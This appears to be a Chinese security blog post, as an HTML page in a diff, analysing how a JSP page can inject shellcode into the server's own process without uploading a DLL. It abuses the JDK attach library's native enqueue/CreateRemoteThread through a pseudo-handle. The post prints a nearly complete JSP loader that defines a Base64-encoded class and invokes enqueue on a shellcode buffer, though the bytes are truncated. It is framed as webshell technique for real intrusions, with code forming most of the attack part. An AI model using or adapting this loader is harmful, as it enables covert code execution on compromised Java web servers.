@@ -1,0 +1,171 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>JSP文件无依赖加载shellcode分析 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="JSP文件无依赖加载shellcode分析"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>JSP文件无依赖加载shellcode分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/21/JSP文件无依赖加载shellcode分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-21T06:52:24.000Z">
+          2021-10-21
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    去年分析过JSP加载shellcode上线的技术，但是由于需要先上传DLL到目标主机，所以在真实环境下并不方便使用，最近看到<code>rebeyond</code>发表的关于<code>Java原生远程进程注入</code>的文章，可以实现无需依赖上传的<code>dll</code>实现<code>JSP</code>加载shellcode的功能，因此决定写下这篇文章分析和复现其中的技术。</p>
+<span id="more"></span>
+
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>​    平时执行shellcode时经常会使用远程线程注入，也就是<code>CreateRemoteThread</code>。之前我们的实现中是自己通过JNI实现了一个<code>CreateRemoteThread</code>来加载我们的shellcode，这种情况当然是需要将生成的dll传到目标下的，但是如果JDK的Native 层的函数中中本身实现了<code>CreateRemoteThread</code>并且可以接收我们的参数执行，那不就不需要上传DLL了。</p>
+<p>​    在<code>Java Agent</code>中，我们要想实现在另一个进程中注入我们的<code>Agent</code>,一定要实现不同JVM之间通信，并且是需要在另一个JVM进程中注入我们的Agent并执行，所以一定会使用<code>CreateRemoteThread</code>。具体的实现在<code>enqueue</code>中，而具体的实现则在<code>Java_sun_tools_attach_WindowsVirtualMachine_enqueue</code>中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">long</span> var0, <span class="keyword">byte</span>[] var2, String var3, String var4, Object... var5)</span> <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    实现如下会在进程中为<code>stub</code>分配内存并通过<code>CreateRemoteThread</code>创建线程执行。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_sun_tools_attach_WindowsVirtualMachine_enqueue</span></span></span><br><span class="line"><span class="function">  <span class="params">(JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">   jstring pipename, jobjectArray args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">       <span class="comment">//获取stub的长度和指向stub内容的指针</span></span><br><span class="line"></span><br><span class="line">    stubLen = (DWORD)(*env)-&gt;<span class="built_in">GetArrayLength</span>(env, stub);</span><br><span class="line">    stubCode = (*env)-&gt;<span class="built_in">GetByteArrayElements</span>(env, stub, &amp;isCopy);</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">//在进程空间中为stub分配内存</span></span><br><span class="line"></span><br><span class="line">    pCode = (PDWORD) <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="number">0</span>, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">...</span><br><span class="line">    <span class="comment">//将stub中的内容写入分配的内存中</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, <span class="literal">NULL</span> );</span><br><span class="line">   ...</span><br><span class="line">    <span class="comment">//CreateRemoteThread在hProcess的进程空间中创建一个线程执行传入的stub。</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>( hProcess,</span><br><span class="line">                                  <span class="literal">NULL</span>,</span><br><span class="line">                                  <span class="number">0</span>,</span><br><span class="line">                                  (LPTHREAD_START_ROUTINE) pCode,</span><br><span class="line">                                  pData,</span><br><span class="line">                                  <span class="number">0</span>,</span><br><span class="line">                                  <span class="literal">NULL</span> );</span><br></pre></td></tr></table></figure>
+
+<p>​    下面我们要解决如何获取进程句柄的问题，在<code>WindowsVirtualMachine</code>中是通过<code>openProcess</code>得到进程句柄并传入到<code>enqueue</code>中执行的,我们分析下Native层函数<code>openProcess</code>的实现。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">WindowsVirtualMachine(AttachProvider var1, String var2) <span class="keyword">throws</span> AttachNotSupportedException, IOException &#123;</span><br><span class="line">       <span class="keyword">super</span>(var1, var2);</span><br><span class="line">       <span class="keyword">int</span> var3;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           var3 = Integer.parseInt(var2);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NumberFormatException var6) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> AttachNotSupportedException(<span class="string">&quot;Invalid process identifier&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">this</span>.hProcess = openProcess(var3);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           enqueue(<span class="keyword">this</span>.hProcess, stub, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> AttachNotSupportedException(var5.getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    <code>Java_sun_tools_attach_WindowsVirtualMachine_openProcess</code>中分了两种情况，如果传入的进程ID等于当前进程ID则获取当前进程的句柄并返回。如果不是则获取传入进程ID的句柄并返回。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jlong JNICALL <span class="title">Java_sun_tools_attach_WindowsVirtualMachine_openProcess</span></span></span><br><span class="line"><span class="function">  <span class="params">(JNIEnv *env, jclass cls, jint pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = NULL;</span><br><span class="line">	<span class="comment">//获取当前进程的句柄并返回</span></span><br><span class="line">    <span class="keyword">if</span> (pid == (jint) GetCurrentProcessId()) &#123;</span><br><span class="line">        <span class="comment">/* process is attaching to itself; get a pseudo handle instead */</span></span><br><span class="line">        hProcess = GetCurrentProcess();</span><br><span class="line">        <span class="comment">/* duplicate the pseudo handle so it can be used in more contexts */</span></span><br><span class="line">        <span class="keyword">if</span> (DuplicateHandle(hProcess, hProcess, hProcess, &amp;hProcess,</span><br><span class="line">                PROCESS_ALL_ACCESS, FALSE, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Could not duplicate the handle which isn&#x27;t a good sign,</span></span><br><span class="line"><span class="comment">             * but we&#x27;ll try again with OpenProcess() below.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            hProcess = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//获取传入的进程ID的句柄并返回</span></span><br><span class="line">    <span class="keyword">if</span> (hProcess == NULL) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Attempt to open process. If it fails then we try to enable the</span></span><br><span class="line"><span class="comment">         * SE_DEBUG_NAME privilege and retry.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == NULL &amp;&amp; GetLastError() == ERROR_ACCESS_DENIED) &#123;</span><br><span class="line">            hProcess = doPrivilegedOpenProcess(PROCESS_ALL_ACCESS, FALSE,</span><br><span class="line">                           (DWORD)pid);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hProcess == NULL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (GetLastError() == ERROR_INVALID_PARAMETER) &#123;</span><br><span class="line">                JNU_ThrowIOException(env, <span class="string">&quot;no such process&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">char</span> err_mesg[<span class="number">255</span>];</span><br><span class="line">                <span class="comment">/* include the last error in the default detail message */</span></span><br><span class="line">                sprintf(err_mesg, <span class="string">&quot;OpenProcess(pid=%d) failed; LastError=0x%x&quot;</span>,</span><br><span class="line">                    (<span class="keyword">int</span>)pid, (<span class="keyword">int</span>)GetLastError());</span><br><span class="line">                JNU_ThrowIOExceptionWithLastError(env, err_mesg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (jlong)<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    如果我们想实现在<code>JSP</code>中加载shellcode的功能，按照目前的分析结果是需要知道进程ID的，但是有一个伪句柄的概念,所以我们就可以通过设置<code>phandle</code>的值为<code>-1</code>将shellcode注入到当前服务器的进程。</p>
+<blockquote>
+<p>伪句柄是一个特殊的常量，当前为（HANDLE）-1，它被解释为当前进程的句柄。</p>
+</blockquote>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>​    <code>rebeyond</code>师傅的实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadMain</span>   </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;attach&quot;</span>);</span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;sun.tools.attach.WindowsVirtualMachine&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method m:cls.getDeclaredMethods())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.getName().equals(<span class="string">&quot;enqueue&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">long</span> hProcess=-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[]   <span class="comment">//pop calc.exe</span></span><br><span class="line">                        &#123;</span><br><span class="line">                                (<span class="keyword">byte</span>) <span class="number">0xfc</span>, ... (<span class="keyword">byte</span>) <span class="number">0x65</span>, (<span class="keyword">byte</span>) <span class="number">0x00</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                String cmd=<span class="string">&quot;load&quot;</span>;String pipeName=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">                m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object result=m.invoke(cls,<span class="keyword">new</span> Object[]&#123;hProcess,buf,cmd,pipeName,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br><span class="line">                System.out.println(<span class="string">&quot;result:&quot;</span>+result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    上面的代码放到JSP中执行会出现找不到<code>sun.tools.attach.WindowsVirtualMachine</code>类的异常，因为这个类在<code>tools.jar</code>中，而<code>tools.jar</code>并没有在<code>JDK</code>的核心库中。</p>
+<p><img src="/2021/10/21/JSP%E6%96%87%E4%BB%B6%E6%97%A0%E4%BE%9D%E8%B5%96%E5%8A%A0%E8%BD%BDshellcode%E5%88%86%E6%9E%90/image-20211022150206074.png" alt="image-20211022150206074"></p>
+<p>​    但是本质上我们只是想使用native层的<code>enqueue</code>函数，但我们也知道JAVA调用native层的函数有一个命名规范，只有包名和类名都一致时才能调用到指定的native方法，<code>enqueue</code>方法在C++层面的实现函数为<code>Java_sun_tools_attach_WindowsVirtualMachine_enqueue</code>，所以我们要只要创建一个<code>WindowsVirtualMachine</code>类，并实现其中的<code>enqueue</code>方法即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowsVirtualMachine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">long</span> hProcess, <span class="keyword">byte</span>[] stub,</span></span></span><br><span class="line"><span class="params"><span class="function">                               String cmd, String pipename, Object... args)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;attach&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    如果我们在JSP中直接定义<code>WindowsVirtualMachine</code>类，会被编译为一个内部类并且还会对类名进行改变，所以我们要先将这个类编译好通过<code>defineClass</code>加载即可,JSP完整实现如下。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Myloader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> //继承<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">get</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">	      String classStr=<span class="string">&quot;yv66vgAAADQAHgoABQAUCAAVCgAWABcHABgHABkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZTsBAAdlbnF1ZXVlAQA9KEpbQkxqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspVgEACkV4Y2VwdGlvbnMHABoBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwABgAHAQAGYXR0YWNoBwAbDAAcAB0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABAAFAAAAAAADAAEABgAHAAEACAAAAC8AAQABAAAABSq3AAGxAAAAAgAJAAAABgABAAAABQAKAAAADAABAAAABQALAAwAAAGIAA0ADgABAA8AAAAEAAEAEAAIABEABwABAAgAAAAiAAEAAAAAAAYSArgAA7EAAAABAAkAAAAKAAIAAAAJAAUACgABABIAAAACABM=&quot;</span>;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            Class cls = <span class="keyword">new</span> Myloader().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">                <span class="keyword">for</span> (Method m:cls.getDeclaredMethods())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.getName().equals(<span class="string">&quot;enqueue&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">long</span> hProcess=-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[]   <span class="comment">//pop calc.exe</span></span><br><span class="line">                        &#123;</span><br><span class="line">                                (<span class="keyword">byte</span>) <span class="number">0xfc</span>, (<span class="keyword">byte</span>) <span class="number">0x48</span>, (<span class="keyword">byte</span>) <span class="number">0x83</span>, (<span class="keyword">byte</span>) <span class="number">0xe4</span>, (<span class="keyword">byte</span>) <span class="number">0xf0</span>,...</span><br><span class="line">                        &#125;;</span><br><span class="line">                String cmd=<span class="string">&quot;load&quot;</span>;String pipeName=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">                m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object result=m.invoke(cls,<span class="keyword">new</span> Object[]&#123;hProcess,buf,cmd,pipeName,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br><span class="line">                System.out.println(<span class="string">&quot;result:&quot;</span>+result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    <code>rebeyond</code>师傅<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075#toc-6">Java内存攻击技术漫谈</a>真的写的非常精彩，也让我意识到了自己知识储备上的不足。最后还是感谢师傅的分享。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
